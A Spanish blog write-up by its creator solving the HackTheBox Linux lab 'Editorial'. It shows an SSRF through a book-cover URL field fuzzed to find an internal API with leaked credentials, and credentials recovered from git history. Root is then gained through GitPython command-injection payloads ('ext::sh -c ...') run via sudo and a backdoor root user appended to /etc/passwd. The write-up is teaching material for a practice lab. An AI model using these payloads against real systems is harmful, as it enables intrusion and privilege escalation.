---
layout      : post
title       : "HackTheBox - Editorial"
author      : lanz
footer_image: assets/images/footer-card/linux-icon.png
footer_text : Linux
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-banner.png
category    : [ htb ]
tags        : [ ssrf, .git-folder-leak, GitPython, /etc/passwd, sudo ]
---
Entorno (creado por mí, ¡qué emoción! 😊🥳) Linux nivel fácil. **SSRF** y fuzzeos para encontrar servicios internos, cositas en desarrollo y credenciales voladoras, lecturas históricas mediante **.git** e inyección de comandos explotando la librería **GitPython**.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-lab-information.png" style="width: 100%;"/>

**💥 Laboratorio creado por**: [Lanz](https://app.hackthebox.com/profile/73707). SIII, POR MIIIIIIIIII!!! 😭

Antes de, muchas gracias a HTB por permitirme subir una máquina, fue un lindo reto/proceso personal/emotivo, cumplí uno de mis sueños de hace mucho, que era aportar al aprendizaje de las personas mediante **HackTheBox**. Me divertí mucho en todo el camino recorrido, desde los rechazos hasta la parte en que estaba viendo que la máquina tenía como 2 de calificación 😝 me la goce :P

También te agradezco a ti, por tomarte el tiempo de aprender, de crecer, de retarte y de confiar en ti 😙

Y sí, quise devolver un trocito pequeño de todo lo que he aprendido de HTB y sus creadores 💚💚💚

Ahora sí, de cabeza y sin casco 🤪

...

## TL;DR (Spanish writeup)

Ay ama, esa biblioteca es gigante, ¿dónde puso el libro de Lanz?

A mano limpia contra el sitio web de una editorial. Nos darán la oportunidad de subir información de un libro para que sea publicado por ellos, entre esa información podremos ver un preview de la portada de nuestro libro, podemos pasar la imagen como archivo o usar una URL.

Usando la URL llegaremos a la imagen, pero explotando un `Server Side Request Forgery` (`SSRF`) también visitaremos servicios internos de la editorial.

Mediante el `SSRF` descubriremos una `API`, la cual está en desarrollo y tiene información peligrosa entre ella, usaremos esa info para obtener una sesión como el usuario `dev` en el sistema.

En el directorio **home** de `dev`, existe una carpeta donde se trabajó el proyecto de la página web y de la API, en él un directorio `.git` el cual permite divisar commits pasados y demás datos, usándolo llegaremos al usuario `prod`.

Nos daremos cuenta de que `prod` tiene permiso para ejecutar un script de **Python** como el usuario `root`. Este script está realizando movimientos curiosos con ayuda de la librería `GitPython`, la cual cuenta con varias vulnerabilidades, usaremos una de ellas para inyectar comandos en el sistema, así, crearemos un usuario con los mismos permisos de **root** y seremos administradores del servidor.

...

### Clasificación de la máquina según la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-statistics.png" style="width: 80%;"/>

Vulns reales, procesos reales, pero quién soy yo para juzgarla :P

> La idea inicial de esta locura es tener mis "notas" por si algun día se me olvida todo (lo que es muuuy probable), leer esto y reencontrarme (o talvez no) 😄 La segunda idea surgio con el tiempo, ya que me di cuenta que esta es una puerta para personitas que como yo al inicio (o simplemente a veces) nos estancamos en este mundo de la seguridad, por lo que si tengo la oportunidad de ayudarlos ¿por qué no hacerlo?

> Un detalle es que si ves mucho texto, es por que me gusta mostrar tanto errores como exitos y tambien plasmar todo desde una perspectiva más de enseñanza que de solo pasos a seguir. Sin menos, muchas gracias <3

...

Karenn.

1. [Reconocimiento](#reconocimiento).
2. [Enumeración](#enumeracion).
  * [Visitando sitio web](#enumeracion-puerto-80).
  * [Jugando con la previsualización de la portada](#enumeracion-puerto-80-preview).
3. [Explotación](#explotacion).
  * [Fuzzeando los 65535 puertos, buscando servicios](#explotacion-ssrf).
4. [Movimiento lateral: dev -> prod](#lateral-prod).
  * [Los logs, los sagrados logs](#lateral-prod-git-folder).
5. [Escalada de privilegios](#escalada-de-privilegios).
  * [Creando usuario administrador](#escalada-gitpython-create-user).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

Vamos a descubrir que servicios (puertos) está corriendo la máquina que vamos a atacar, para ellos me apoyaré de la herramienta `nmap`:

```bash
nmap -p- --open -v 10.10.11.20 -oA TCP-initScan-HTBeditorial
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535 puertos |
| --open    | Devuelve solo los puertos que estén abiertos |
| -v        | Permite ver en consola lo que va encontrando |
| -oA       | Guarda el output en diferentes formatos, entre ellos uno "grepeable". Lo usaremos junto a la función [extractPorts](https://pastebin.com/raw/X6b56TQ8) de [S4vitar](https://s4vitar.github.io/) para copiar los puertos en la clipboard rápidamente |

Nos devuelve:

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Servicio que permite la obtención de una terminal de forma segura |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Servicio para interactuar con un servidor web |

> Usando la función `extractPorts` (referenciada antes) podemos tener rápidamente los puertos en la clipboard, en este caso no es necesario (ya que tenemos pocos puertos), pero si tuviéramos varios puertos evitamos tener que escribirlos uno a uno:
 
> ```bash
> extractPorts TCP-initScan-HTBeditorial.gnmap
> ```

Ya con los puertos, podemos seguir usando `nmap`, en este caso para que nos extraiga mucha más información (como la versión del software) y que también use sus scripts predefinidos contra la máquina, a ver que consigue...

```bash
nmap -sCV -p 22,80 10.10.11.20 -oA TCP-portScan-HTBeditorial
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Indicamos a qué puertos queremos realizar el escaneo |
| -sC       | Ejecuta scripts predefinidos contra cada servicio |
| -sV       | Intenta extraer la versión del servicio |

**Nmap** nos ilumina:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 |
| 80     | HTTP     | nginx 1.18.0 |

Además, que nos avisa que el sitio web está redireccionando a un dominio:

```txt
Did not follow redirect to http://editorial.htb
```

Para que lo tengamos en cuenta 🏃‍♀️

# Enumeración [#](#enumeracion) {#enumeracion}

---

## Visitando sitio web [📌](#enumeracion-puerto-80) {#enumeracion-puerto-80}

Lo primero y llamativo es llegarle al sitio web, pero como hay un redireccionamiento y nuestro sistema no entiende que es eso de `editorial.htb`, pues vamos a enseñárselo mediante el archivo [/etc/hosts](https://www.arsys.es/blog/modificar-hosts):

```bash
➧ tail -n 1 /etc/hosts
10.10.11.20     editorial.htb
```

Ahora sí, al visitar el sitio:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-page80.png" style="width: 100%;"/>

Información sobre libros, recorriendo "About" (`/about`) extraemos:

```txt
submissions@tiempoarriba.htb
```

Lo cual puede ser un indicio de otro dominio o de buscar subdominios. Sigamos enumerando.

Visitando "Publish with us" (`/upload`), vemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-page80-upload.png" style="width: 100%;"/>

Un formulario para enviar a la editorial información sobre un libro que queramos publicar con ellos...

Si llenamos los campos, usamos [Burp Suite](https://portswigger.net/burp/communitydownload) para interceptar las peticiones y enviamos la trama, la información al dar clic sobre "Send book info" viaja así:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-burp-reqYres-page80-upload.png" style="width: 100%;"/>

Notamos que no todos los campos están en la petición, nos faltan los dos primeros, los relacionados con el cover del libro...

> Acá les digo, intenté de todas las formas posibles hacer el preview y a su vez enviar todos los campos como parte de ese form (pues nativamente), pero ufff pailas. Tomemos esto como que el sitio web está en desarrollo :P y que el desarrollador (yo) no sabe nada :P

Inspeccionando el código fuente, encontramos el uso que se le da a esos campos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-source-page80-upload.png" style="width: 100%;"/>

Si el botón "Preview" es activado, realiza una petición POST a `/upload-cover` enviando los dos campos y según cuál tenga contenido, crea un tag `img` para mostrar la imagen (como un preview :P).

Es algo curioso, así que profundicemos en esto.

## ¿Cómo me veo? [📌](#enumeracion-puerto-80-preview) {#enumeracion-puerto-80-preview}

La información general que tenemos en este apartado es:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-page80-upload-cover-default.png" style="width: 100%;"/>

Al parecer está cargando una imagen por default.

Si usamos la opción de cargar un archivo de nuestro sistema y damos clic en "Preview", efectivamente previsualizamos la imagen:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-page80-upload-cover-file.png" style="width: 100%;"/>

Ahora notamos que podemos hacer lo mismo, pero pasándole una URL donde se esté alojando alguna imagen. Descarguemos una imagen, levantemos un servidor web en su ruta y probemos:

```bash
➧ ls   
🖼️ nicola.jpg
➧ python3 -m http.server
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-page80-upload-cover-url.png" style="width: 100%;"/>

Yyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-page80-upload-cover-url-nicola.png" style="width: 100%;"/>

Liiisto, si llegó a nuestro servidor web. 

Si revisamos la petición interceptada extraemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-burp-reqYres-page80-upload-cover-url-nicola.png" style="width: 100%;"/>

Devuelve la ruta donde se está almacenando la imagen y la que usara para hacer el preview.

# Explotación [#](#explotacion) {#explotacion}

INTERESANTE esta característica de jugar con una URL externa.

> Lindo que puedo subir una imagen externa, qué dinamico 😋, ya que puedo usar cualquier imagen de internet ...

Solo que se vuelve muuuucho más interesante cuando pensamos:

> ... ¿pero podria intentar subir (previsualizar) algo interno, algo que no este expuesto en internet? 😈

Este pensamiento tiene nombre propio:

🔥 **Falsificación de Solicitud del Lado del Servidor (Server Side Request Forgery)** 🔥

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-google-owasp-ssrf-description.png" style="width: 100%;"/>

> Tomada de: [OWASP - SSRF](https://owasp.org/Top10/es/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)

Más referencias:

* [PortSwigger - SSRF](https://portswigger.net/web-security/ssrf).
* [Hackmetrix - SSRF](https://blog.hackmetrix.com/ssrf-server-side-request-forgery/).

Esta vulnerabilidad es bien linda, ya que como dice arriba, podemos aprovechar alguna funcionalidad que esté usando una URL para hacer que el servidor haga peticiones contra sí mismo, logrando así interactuar con servicios arbitrarios :P Todo depende de la sanitización que tenga (o no) el sitio web.

Entonces, en lugar de intentar llegar a `10.10.14.90` (como en nuestro ejemplo anterior), podríamos apuntar al localhost: `127.0.0.1` o `localhost` (si existen restricciones, siempre hay [formas de intentar bypassearlas](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#bypassing-filters)).

¿Y de qué nos serviría llegar a la dirección `127.0.0.1`? Entre todas las puertas que podemos tocar con esta vuln, una de ellas es la de descubrir servicios (puertos), por lo que si existe internamente algún proyecto en desarrollo, alguna API o algo así, pues la idea es llegar a ellos :O

Para hacer esto simplemente debemos intentar hacer 65535 peticiones, ¿y por qué ese número? Es el total de puertos disponibles que existen (info [aquí](https://www.cloudflare.com/es-es/learning/network-layer/what-is-a-computer-port/) y [aquí](https://es.wikipedia.org/wiki/Anexo:Puertos_de_red)).

Cada petición debe ir tal que:

```txt
[...]
127.0.0.1:22
[...]
127.0.0.1:80
[...]
127.0.0.1:8000
[...]
```

Usando un fuzzer es la forma más rápida de lograr esto, usaremos [ffuf](https://github.com/ffuf/ffuf), pero si quieres usar otro, solo es acoplar lo usado...

## 65535 peticiones, uff me cansé [📌](#explotacion-ssrf) {#explotacion-ssrf}

Para que sea muuuuuuu(uuuuuu)cho más fácil, vamos a apoyarnos de la petición interceptada al enviar el "Preview":

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-burp-reqYres-page80-upload-cover-url-nicola.png" style="width: 100%;"/>

Y enviemos un valor random en lugar de una URL válida, así identificamos si cambia algo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-burp-reqYres-page80-upload-cover-url-asdfasdfsdf.png" style="width: 100%;"/>

¿Notas que cambió la respuesta? Al parecer, si se le pasa algo inválido, carga la imagen por default que ya conocimos antes.

Entonces, tomemos toda tooooda la petición, con sus headers y demás, peguémosla en un archivo de nuestro sistema y modifiquemos el input "bookurl" para que quede así:

```txt
http://127.0.0.1:FUZZ
```

> Donde `FUZZ` es lo que usa **ffuf** para identificar donde debe ir cambiando los valores de cada petición.

Tendríamos finalmente:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-bash-cat-req-page80-upload-cover.png" style="width: 100%;"/>

Solo nos queda crear la lista de puertos, lo logramos fácilmente usando el comando [seq](https://www.ochobitshacenunbyte.com/2020/11/18/5-ejemplos-practicos-del-comando-seq-en-linux/):

```bash
➧ seq 1 65535 | head -n 2
1
2
➧ seq 1 65535 | tail -n 2
65534
65535
```

```bash
seq 1 65535 > ports.txt
```

Entonces, **ffuf** va a tomar cada palabra (puerto) del archivo `ports.txt`, como ejemplo, pensemos que toma `1`, entra al archivo de la petición y cambia `http://127.0.0.1:FUZZ` por `http://127.0.0.1:1`, la envía y toma la siguiente palabra (`2`), sigue así hasta los 65535 puertos que le indicamos.

```bash
ffuf -c -w ports.txt -request post-upload-cover.req -request-proto http -fs 61
```

* `-c` pa darle color a la vida.
* `-request` toma el archivo donde está la petición.
* `-request-proto` permite indicar si se intenta hacer HTTP o HTTPS.
* `-fs` para filtrar respuestas con tamaño de 61, ya que sin él obtenemos muchas falsas esperanzas.

Ejecutamos yyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-bash-ffuf-page80-upload-cover.png" style="width: 100%;"/>

El puerto 5000 está devolviendo informaciÓÓÓÓÓÓóÓóóÓNn, a verla:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-burp-reqYres-page80-upload-cover-url-localhost-5000.png" style="width: 100%;"/>

Y revisando la ruta que nos devuelve (que no es la default, así queeeeee ojito):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-burp-reqYres-page80-static-uploads-localhost-5000.png" style="width: 100%;"/>

Ujujuiii, parece que le pegamos a una API internaa!! Y nos está mostrando sus rutas:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-bash-echoYjq-json-static-uploads-localhost-5000.png" style="width: 60%;"/>

¿Cómo podemos ver el contenido de cada ruta? Debemos seguir usando el SSRF, ya que es algo propio del puerto 5000 que está interno:

```txt
POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: */*
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------255246947212312145372072155828
Content-Length: 401
Origin: http://editorial.htb
Connection: close
Referer: http://editorial.htb/upload
Priority: u=0

-----------------------------255246947212312145372072155828
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:5000/ACÁ_LAS_RUTINGAS
-----------------------------255246947212312145372072155828
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


-----------------------------255246947212312145372072155828--
```

Probando cada ruta, notamos algo en `/api/latest/metadata/messages/authors`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-burp-reqYres-page80-upload-cover-url-localhost-5000-api-authors.png" style="width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-bash-curl-page80-static-uploads-localhost-5000-api-authors.png" style="width: 100%;"/>

¿Lo ves? Esato, hay unas credenciales de desarrollo, entiendo que como está internamente, aún está en pruebas y pues se les olvidó un pequeño detalle.

Si intentamos conexión mediante **SSH** con esas creds:

```bash
ssh dev@editorial.htb
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-bash-shell-dev.png" style="width: 70%;"/>

TAMOS DENTROOOOOO 🚌🏗️🚌🚌🏗️

# Movimiento lateral : dev -> prod [#](#lateral-prod) {#lateral-prod}

---

## Los logs, los sagrados logs [📌](#lateral-prod-git-folder) {#lateral-prod-git-folder}

Somos el usuario `dev`, revisando su directorio `/home` encontramos la carpeta `apps`, ella internamente contiene:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-bash-shell-dev-ls-apps.png" style="width: 100%;"/>

¿Qué notas que pueda ser interesante revisar?

Efectivamente, al parecer la carpeta `apps` fue el inicio de los proyectos (`app_api` y `app_editorial`) y el control de versiones fue realizado con [Git](https://git-scm.com/), así los desarrolladores podían guardar sus cambios, alojarlos externamente, etc., manejar todo más organizado. ¿Y como sabemos esto? Ya que siempre que se inicia un proyecto con **Git**, se crea la carpeta `.git` y allí se aloja información como logs, como descripciones, como detalles, información "irrelevante".

* [Más info de lo que se puede encontrar en un objeto **.git**](https://medium.com/analytics-vidhya/git-part-3-discover-the-git-folder-ca3e828eab3d)
* [Git Cheat-Sheet](https://education.github.com/git-cheat-sheet-education.pdf)

Algo que podemos revisar son los commits que se hicieron:

```bash
git log
# o para verlo más comprimido
git log --oneline
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-bash-shell-dev-apps-git-log.png" style="width: 100%;"/>

Hay uno llamativo y es ese que hace referencia a "degradar de prod a dev", veámoslo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-bash-shell-dev-apps-git-show-downgrading-prod-dev.png" style="width: 100%;"/>

EEEEEEjeleasdfjalskdj, como ya vimos, actualmente las pruebas las están haciendo con credenciales de desarrollo (feito), pero antes las estaban haciendo con credenciales de producción (más feito) (o se les olvidó y lo subieron así), pero el caso es que les toco cambiarlas y quedo todo registrado en los commits.

Lo lindo es que existe un usuario llamado `prod` en el sistema, tomemos esas credenciales y averigüemos si nos sirven:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-bash-shell-prod.png" style="width: 100%;"/>

SISOSOSISAAA, tamos como el usuario `prod` 🖐️🎥🎥

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Revisando si contamos con permisos sobre archivos usando a otros usuarios, notamos uno como el usuario **root**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-bash-shell-prod-sudo-l.png" style="width: 100%;"/>

Nos indica que podemos ejecutar el script `/opt/internal_apps/clone_changes/clone_prod_change.py` como el usuario **root** y usando **Python3**.

Revisándolo obtenemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-bash-shell-prod-lsYcat-clone_prod_change_py.png" style="width: 100%;"/>

No tenemos permisos de escritura sobre el archivo y su contenido es bien directo y sencillo:

Inicialmente el programa se posiciona en el directorio `/opt/internal_apps/clone_changes`, ahí es donde hace toda su ejecución. Toma un parámetro y lo guarda en una variable llamada `url_to_clone`, lo siguiente que hace es iniciar un repositorio y clonar los cambios alojados en la URL que le pasamos, sobre la carpeta `new_changes`.

Si buscamos en la web "from git import Repo", conocemos la librería involucrada:

* [GitPython](https://gitpython.readthedocs.io/en/stable/tutorial.html).

Ejecutando el programa, nos muestra:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-bash-shell-prod-sudo-py-clone_prod_change_py.png" style="width: 100%;"/>

Bien, gracias al `cmdline` sabemos como se está tratando lo que enviamos, pero probando inyecciones y demás cositas, no logramos nada...

Aprovechando que conocemos la librería, si ahora buscamos en internet "GitPython vulns", encontramos:

* [https://security.snyk.io/package/pip/gitpython](https://security.snyk.io/package/pip/gitpython)

Entre ellas, descubrimos una vulnerabilidad (CVE-2022-24439) para inyectar comandos, esto en caso de que la URL a clonar sea suministrada por el usuario y no exista sanitización contra ella. Un atacante puede pasar una "URL" maliciosa para ejecutar comandos en el sistema :O

* [Remote Code Execution (RCE) - gitpython](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858)

Como prueba de que exista la vuln, se puede pasar como URL:

```bash
'ext::sh -c touch% /tmp/pwned'
```

Que lo que hará será aprovechar el protocolo externo (`ext`) para ejecutar mediante `sh` el comando `touch /tmp/pwned`, o sea, crear un archivo llamado `pwned` dentro de la carpeta `/tmp` :O

> Ten en cuenta el '`% `', es importante ya que así interpreta/escapa los espacios.

Si lo ejecutamos:

```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/pwned'
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-bash-shell-prod-sudo-py-clone_prod_change_py-ext-touch-pwned.png" style="width: 100%;"/>

¡SI SE ESTA CREANDO EL ARCHIVO yyyyyy EL DUEÑO ES `root`! Con lo cual ya tenemos la forma de escalar privilegios (:

## Creando usuario con todos los juguetes [📌](#escalada-gitpython-create-user) {#escalada-gitpython-create-user}

Para explotar esta vuelta, vamos a jugar con una escalada que me gusta mucho, es la de crear usuarios mediante el archivo `/etc/passwd`.

Nuestro usuario se llamará `elsancochon` y tendrá la contraseña `estoqueesnojoda`.

Primero debemos [generar el hash relacionado con esa contraseña](https://unix.stackexchange.com/questions/8229/what-methods-are-used-to-encrypt-passwords-in-etc-passwd-and-etc-shadow):

```bash
➧ openssl passwd estoqueesnojoda
$1$2yNypry0$SlzzxGBZ8Ebvtql/nwPWm1
```

Ahora creamos la sintaxis necesaria para alojar el usuario en el archivo `/etc/passwd`, veamos como está definido `root` para guiarnos:

```bash
prod@editorial:/opt/internal_apps/clone_changes$ head -n 1 /etc/passwd
root:x:0:0:root:/root:/bin/bash
```

* `root` es el nombre del usuario.
* `x` es la contraseña, si no está acá la busca en el `/etc/shadow`.
* `0` es el UID (User ID), el 0 hace referencia a **root**.
* `0` es el GID (Group ID), igual que antes, el 0 relaciona a **root**.
* `root` es información extra que le queramos dar al usuario.
* `/root` es el directorio HOME del usuario.
* `/bin/bash` es la shell con la que va a iniciar una conexión.

> Más info: [cyberciti.biz - /etc/passwd format](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/)

Con esto en menteeeeee, nos armamos:

```bash
elsancochon:$1$2yNypry0$SlzzxGBZ8Ebvtql/nwPWm1:0:0:estamosOkhe:/root:/bin/bash
```

Ahora nos acomodamos:

```bash
prod@editorial:/opt/internal_apps/clone_changes$ mkdir /tmp/.my-things
prod@editorial:/opt/internal_apps/clone_changes$ cd !$
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-bash-shell-prod-echoYcat-nu_txt.png" style="width: 100%;"/>

Y finalmente creamos el script que vamos a ejecutar mediante la vulnerabilidad:

> Hacemos esto para unicamente modificar el contenido del script, así no nos preocupamos por espacios o cosas raras al ejecutar la vuln.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-bash-shell-prod-echoYcat-naneninonu_sh.png" style="width: 100%;"/>

> El script tomara el contenido del archivo `nu.txt` y lo agregará como una nueva linea al final del objeto `passwd`.

Le damos permisos de ejecución al script:

```bash
prod@editorial:/tmp/.my-things$ chmod +x naneninonu.sh
```

Y estamos liiiiiistos:

```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% /tmp/.my-things/naneninonu.sh'
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-bash-shell-prod-sudo-py-clone_prod_change_py-ext-bash-naneninonu_sh.png" style="width: 100%;"/>

Adjuntó correctamente la línea... Y si validamos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-bash-shell-root.png" style="width: 100%;"/>

SISISI, somos **roooooooot** 🥕🥕🥕

Y listones, terminamos la resolución...

# Post-Explotación [#](#post-explotacion) {#post-explotacion}

---

## Flags [📌](#post-explotacion-flags) {#post-explotacion-flags}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/editorial/htb608-flags.png" style="width: 100%;"/>

...

¡Fue una máquina que me encantó hacer, hubo cambios que quise implementar ya con la máquina activa, hubo cosas que me hicieron cambiar (ya que era muy difícil para ser fácil (que igualmente termino siendo rateada como media :P)), me la devolvieron como 4 veces, pero nada, hay que seguir!!

Igual fue un proceso que disfruté mucho, era realmente un sueño que tenía, el poder devolverle un poooooquitiquitico de todo lo que me ha dado HTB (y los creadores de máquinas).

Espero que también te haya gustado la máquina, que la hayas disfrutado, que hayas aprendido o reforzado temas y nada, nos seguiremos leyendo por estos lares :*

¡A seguir dándole duro y a romper de todooooooooo!!